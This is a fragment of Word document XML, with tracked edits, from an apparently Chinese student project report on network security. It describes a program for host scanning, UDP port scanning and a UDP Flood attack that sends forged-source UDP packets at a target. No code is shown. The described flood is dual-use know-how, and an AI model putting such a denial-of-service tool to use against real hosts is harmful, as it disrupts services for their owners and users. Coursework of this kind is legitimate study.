            <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
            <w:ind w:firstLineChars="200" w:firstLine="480"/>
          </w:pPr>
        </w:pPrChange>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711CF81C" w14:textId="103BCB98" w:rsidR="00554707" w:rsidRDefault="00554707" w:rsidP="00554707">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:ins w:id="925" w:author="yong li" w:date="2017-05-14T19:42:00Z"/>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:pPrChange w:id="926" w:author="yong li" w:date="2017-05-14T19:37:00Z">
          <w:pPr>
            <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
            <w:ind w:firstLineChars="200" w:firstLine="480"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="927" w:author="yong li" w:date="2017-05-14T19:38:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:color w:val="000000"/>
          </w:rPr>
          <w:t>随着互联网时代的到来，人们每天都会使用互联网，互联网的发展给</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="928" w:author="yong li" w:date="2017-05-14T19:39:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:color w:val="000000"/>
          </w:rPr>
          <w:t>我们的生活带来的很多的变化，经济的发展对互联网的依赖程度也越来越高</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="929" w:author="yong li" w:date="2017-05-14T19:40:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:color w:val="000000"/>
          </w:rPr>
          <w:t>。于此同时，人们网络安全的意识还很薄弱，</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="930" w:author="yong li" w:date="2017-05-14T19:41:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:color w:val="000000"/>
          </w:rPr>
          <w:t>对网络安全的了解也很少。各种网络攻击的事件时有发生，攻击的</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="931" w:author="yong li" w:date="2017-05-14T19:42:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:color w:val="000000"/>
          </w:rPr>
          <w:t>危害越来越大，影响越来越大。网络安全已经成为全世界关注的问题。</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="60FE4BD3" w14:textId="6606D11F" w:rsidR="00554707" w:rsidRPr="00E90326" w:rsidRDefault="00554707" w:rsidP="00554707">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:pPrChange w:id="932" w:author="yong li" w:date="2017-05-14T19:37:00Z">
          <w:pPr>
            <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
            <w:ind w:firstLineChars="200" w:firstLine="480"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="933" w:author="yong li" w:date="2017-05-14T19:43:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:color w:val="000000"/>
          </w:rPr>
          <w:t>网络攻击的方式多种多样，演变越来越复杂。</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4B002F53" w14:textId="38EA5E60"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w:t>
      </w:r>
      <w:r w:rsidR="003F2283">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>就是采用一种比较特殊的体系结构，利用更多的主</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>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39781EBD"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w:t>
      </w:r>
      <w:r w:rsidR="00ED743B">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>渐增多</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>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w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>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57F27F62" w14:textId="77777777" w:rsidR="00CF7924" w:rsidRDefault="00106FEC" w:rsidP="00CF7924">
      <w:pPr>
        <w:pStyle w:val="20505"/>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="934" w:name="_Toc482141221"/>
      <w:bookmarkStart w:id="935" w:name="_Toc482141894"/>
      <w:bookmarkStart w:id="936" w:name="_Toc482522604"/>
      <w:r w:rsidRPr="00596B1B">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
          <w:rPrChange w:id="937" w:author="李勇" w:date="2017-05-13T21:41:00Z">
            <w:rPr>
              <w:rFonts w:hint="eastAsia"/>
              <w:sz w:val="28"/>
              <w:szCs w:val="28"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>课题发展状况</w:t>
      </w:r>
      <w:bookmarkEnd w:id="934"/>
      <w:bookmarkEnd w:id="935"/>
      <w:r w:rsidR="00C6765D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>（</w:t>
      </w:r>
      <w:r w:rsidR="000D3979">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidR="000D3979" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>课题发展状况</w:t>
      </w:r>
      <w:r w:rsidR="000D3979">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>”的字体</w:t>
      </w:r>
      <w:r w:rsidR="00C6765D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>和“</w:t>
      </w:r>
      <w:r w:rsidR="00C6765D" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>课题背景</w:t>
      </w:r>
      <w:r w:rsidR="00C6765D" w:rsidRPr="00C6765D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:r w:rsidR="000D3979">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidR="000D3979">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C6765D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>不一样，看目录</w:t>
      </w:r>
      <w:r w:rsidR="00C6765D" w:rsidRPr="00C6765D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
      <w:bookmarkEnd w:id="936"/>
    </w:p>
    <w:p w14:paraId="4713DD44" w14:textId="5A24B201" w:rsidR="00150B71" w:rsidRPr="00CF7924" w:rsidRDefault="00CF7924" w:rsidP="00CF7924">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="16"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="938" w:author="renxt" w:date="2017-05-13T20:49:00Z">
        <w:r w:rsidRPr="00F64D75">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
            <w:bCs/>
            <w:color w:val="000000"/>
            <w:kern w:val="16"/>
          </w:rPr>
          <w:t>（</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
            <w:bCs/>
            <w:color w:val="000000"/>
            <w:kern w:val="16"/>
          </w:rPr>
          <w:t>以下内容</w:t>
        </w:r>
        <w:r w:rsidRPr="00F64D75">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
            <w:bCs/>
            <w:color w:val="000000"/>
            <w:kern w:val="16"/>
          </w:rPr>
          <w:t>参考张海阳的</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
            <w:bCs/>
            <w:color w:val="000000"/>
            <w:kern w:val="16"/>
          </w:rPr>
          <w:t>写</w:t>
        </w:r>
        <w:r w:rsidRPr="00F64D75">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
            <w:bCs/>
            <w:color w:val="000000"/>
            <w:kern w:val="16"/>
          </w:rPr>
          <w:t>）</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="79769583" w14:textId="6287DC3D"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w:t>
      </w:r>
      <w:r w:rsidR="00060DE1">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="16"/>
        </w:rPr>
        <w:t>网络</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="16"/>
        </w:rPr>
        <w:t>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78F66D75" w14:textId="41E8B46C" w:rsidR="00F32985" w:rsidRPr="00F32985" w:rsidRDefault="0044745E" w:rsidP="00F32985">
      <w:pPr>
        <w:pStyle w:val="20505"/>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="939" w:name="_Toc482141222"/>
      <w:bookmarkStart w:id="940" w:name="_Toc482141895"/>
      <w:bookmarkStart w:id="941" w:name="_Toc482522605"/>
      <w:r w:rsidRPr="00596B1B">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
          <w:rPrChange w:id="942" w:author="李勇" w:date="2017-05-13T21:42:00Z">
            <w:rPr>
              <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:hint="eastAsia"/>
              <w:sz w:val="28"/>
              <w:szCs w:val="28"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>研究</w:t>
      </w:r>
      <w:r w:rsidR="00CA512A" w:rsidRPr="00596B1B">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
          <w:rPrChange w:id="943" w:author="李勇" w:date="2017-05-13T21:42:00Z">
            <w:rPr>
              <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:hint="eastAsia"/>
              <w:sz w:val="28"/>
              <w:szCs w:val="28"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>的目的</w:t>
      </w:r>
      <w:bookmarkEnd w:id="939"/>
      <w:bookmarkEnd w:id="940"/>
      <w:ins w:id="944" w:author="renxt" w:date="2017-05-13T20:49:00Z">
        <w:r w:rsidR="00CF7924" w:rsidRPr="00F64D75">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
            <w:color w:val="000000"/>
            <w:kern w:val="16"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>（</w:t>
        </w:r>
        <w:r w:rsidR="00CF7924">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
            <w:bCs w:val="0"/>
            <w:color w:val="000000"/>
            <w:kern w:val="16"/>
          </w:rPr>
          <w:t>以下内容</w:t>
        </w:r>
        <w:r w:rsidR="00CF7924" w:rsidRPr="00F64D75">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
            <w:color w:val="000000"/>
            <w:kern w:val="16"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>参考张海阳的</w:t>
        </w:r>
        <w:r w:rsidR="00CF7924">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
            <w:bCs w:val="0"/>
            <w:color w:val="000000"/>
            <w:kern w:val="16"/>
          </w:rPr>
          <w:t>写</w:t>
        </w:r>
        <w:r w:rsidR="00CF7924" w:rsidRPr="00F64D75">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
            <w:color w:val="000000"/>
            <w:kern w:val="16"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>）</w:t>
        </w:r>
      </w:ins>
      <w:bookmarkEnd w:id="941"/>
    </w:p>
    <w:p w14:paraId="1564BE43" w14:textId="126FA811" w:rsidR="00926D80" w:rsidRPr="00F32985" w:rsidRDefault="00F32985" w:rsidP="00ED39E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w:t>
      </w:r>
      <w:r w:rsidR="00812A15">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，提升防御攻击的能力</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>。在实现主机扫描和UDP端口扫描，UDP Flood攻击基本功能的基础上，通过多线程技术提升扫描和攻击效率。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="254BB14D" w14:textId="4C41CC53" w:rsidR="0044745E" w:rsidRPr="00596B1B" w:rsidRDefault="0044745E" w:rsidP="0044745E">
      <w:pPr>
        <w:pStyle w:val="20505"/>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
          <w:rPrChange w:id="945" w:author="李勇" w:date="2017-05-13T21:42:00Z">
            <w:rPr>
              <w:rFonts w:ascii="黑体" w:hAnsi="黑体"/>
              <w:sz w:val="28"/>
              <w:szCs w:val="28"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="946" w:name="_Toc482141223"/>
      <w:bookmarkStart w:id="947" w:name="_Toc482141896"/>
      <w:bookmarkStart w:id="948" w:name="_Toc482522606"/>
      <w:r w:rsidRPr="00596B1B">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
          <w:rPrChange w:id="949" w:author="李勇" w:date="2017-05-13T21:42:00Z">
            <w:rPr>
              <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:hint="eastAsia"/>
              <w:sz w:val="28"/>
              <w:szCs w:val="28"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>任务完成情况</w:t>
      </w:r>
      <w:bookmarkEnd w:id="946"/>
      <w:bookmarkEnd w:id="947"/>
      <w:bookmarkEnd w:id="948"/>
      <w:r w:rsidR="00EB2D91" w:rsidRPr="00596B1B">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
          <w:rPrChange w:id="950" w:author="李勇" w:date="2017-05-13T21:42:00Z">
            <w:rPr>
              <w:rFonts w:ascii="黑体" w:hAnsi="黑体"/>
              <w:sz w:val="28"/>
              <w:szCs w:val="28"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04DCA351" w14:textId="300C10B7" w:rsidR="007D3582" w:rsidRPr="007D3582" w:rsidRDefault="00641489" w:rsidP="007D3582">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:ins w:id="951" w:author="renxt" w:date="2017-05-13T20:44:00Z"/>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="952" w:author="renxt" w:date="2017-05-13T20:44:00Z">
        <w:r w:rsidRPr="00E90326" w:rsidDel="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:delText xml:space="preserve">熟悉了ARP协议、ICMP协议、IP协议、UDP协议等协议及其应用，了解了扫描的基本原理，设计和实现了UDP </w:delText>
        </w:r>
        <w:r w:rsidRPr="00E90326" w:rsidDel="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          </w:rPr>
          <w:delText>F</w:delText>
        </w:r>
        <w:r w:rsidRPr="00E90326" w:rsidDel="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>lood攻击程序。该程序</w:delText>
        </w:r>
        <w:r w:rsidR="00926D80" w:rsidDel="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>实现了，</w:delText>
        </w:r>
        <w:r w:rsidR="006112F5" w:rsidDel="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>基于</w:delText>
        </w:r>
        <w:r w:rsidRPr="00E90326" w:rsidDel="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>ICMP</w:delText>
        </w:r>
        <w:r w:rsidR="00926D80" w:rsidDel="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>协议实现的主机扫描；</w:delText>
        </w:r>
        <w:r w:rsidRPr="00E90326" w:rsidDel="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>基于ARP协议获取主机MAC</w:delText>
        </w:r>
        <w:r w:rsidR="00926D80" w:rsidDel="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>地址；</w:delText>
        </w:r>
        <w:r w:rsidRPr="00E90326" w:rsidDel="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>UDP端口扫描，</w:delText>
        </w:r>
        <w:r w:rsidR="006112F5" w:rsidDel="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>可</w:delText>
        </w:r>
        <w:r w:rsidRPr="00E90326" w:rsidDel="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>发送大量伪造UDP</w:delText>
        </w:r>
        <w:r w:rsidR="00AD551B" w:rsidDel="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>数据</w:delText>
        </w:r>
        <w:r w:rsidR="00F929BC" w:rsidDel="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>包</w:delText>
        </w:r>
        <w:r w:rsidR="00AD551B" w:rsidDel="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>对特定主机和特定端口进行UD</w:delText>
        </w:r>
        <w:r w:rsidR="00AD551B" w:rsidDel="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          </w:rPr>
          <w:delText>P F</w:delText>
        </w:r>
        <w:r w:rsidR="00AD551B" w:rsidDel="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>lood</w:delText>
        </w:r>
        <w:r w:rsidR="00F929BC" w:rsidDel="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>攻击。整个程序逻辑清晰，功能完整</w:delText>
        </w:r>
        <w:r w:rsidRPr="00E90326" w:rsidDel="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>。</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="953" w:author="renxt" w:date="2017-05-13T20:44:00Z">
        <w:r w:rsidR="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>设计和实现了一个</w:t>
        </w:r>
        <w:r w:rsidR="007D3582" w:rsidRPr="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>UDP Flood攻击程序</w:t>
        </w:r>
        <w:r w:rsidR="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>。它能够</w:t>
        </w:r>
        <w:r w:rsidR="007D3582" w:rsidRPr="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>根据用户设定的参数，伪造源MAC、源IP和源端口，向指定主机发送大量的伪造的UDP报文, 对指定的主机进行攻击。</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="954" w:author="renxt" w:date="2017-05-13T20:45:00Z">
        <w:r w:rsidR="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>有以下具体</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="955" w:author="renxt" w:date="2017-05-13T20:44:00Z">
        <w:r w:rsidR="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>功能</w:t>
        </w:r>
        <w:r w:rsidR="007D3582" w:rsidRPr="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>：</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1F721552" w14:textId="08F1B381" w:rsidR="007D3582" w:rsidRPr="007D3582" w:rsidRDefault="007D3582" w:rsidP="007D3582">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:ins w:id="956" w:author="renxt" w:date="2017-05-13T20:44:00Z"/>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="957" w:author="renxt" w:date="2017-05-13T20:44:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>（</w:t>
        </w:r>
        <w:r w:rsidRPr="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>）</w:t>
        </w:r>
        <w:r w:rsidRPr="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>构造相应的UDP报文，向指定主机的指定端口发送，捕获并解析响应报文，根据报文内容判定该主机指定的UDP端口是否开放的；</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="327E0801" w14:textId="7659236C" w:rsidR="00150B71" w:rsidRPr="00D05338" w:rsidRDefault="007D3582" w:rsidP="007D3582">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="958" w:author="renxt" w:date="2017-05-13T20:44:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>（</w:t>
        </w:r>
        <w:r w:rsidRPr="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>2</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>）</w:t>
        </w:r>
        <w:r w:rsidRPr="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
